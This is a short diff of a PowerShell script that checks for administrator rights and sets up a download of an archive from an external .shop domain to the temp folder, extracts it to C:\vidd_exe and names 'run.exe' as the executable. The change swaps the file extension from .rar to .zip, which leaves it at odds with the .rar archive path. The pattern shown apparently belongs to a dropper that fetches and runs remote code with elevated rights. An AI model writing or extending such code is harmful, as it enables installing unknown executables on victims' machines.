@@ -9,7 +9,7 @@ if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdent
     exit
 }
 
-$downloadURL = "https://www.api-qsr.shop/vidd_exe.rar"
+$downloadURL = "https://www.api-qsr.shop/vidd_exe.zip"
 $archiveFile = "$env:TEMP\vidd_exe.rar"
 $extractFolder = "C:\vidd_exe"
 $exeName = "run.exe"
